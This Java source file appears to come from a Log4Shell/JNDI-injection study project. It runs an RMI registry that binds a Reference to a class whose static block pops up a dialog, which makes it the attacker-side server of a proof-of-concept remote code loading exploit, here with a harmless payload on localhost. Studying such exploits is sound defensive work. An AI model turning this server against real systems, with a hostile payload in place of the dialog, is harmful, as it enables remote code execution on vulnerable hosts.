package com.huangbo.log.logsafe;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.swing.*;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiSafeServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        Reference reference = new Reference("com.huangbo.log.logsafe.Hello", "com.huangbo.log.logsafe.Hello", "http://127.0.0.1:1099/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", refObjWrapper);
    }
}
class Hello {
    static {
        JOptionPane.showConfirmDialog(null, "嘿嘿嘿！！");
    }
}

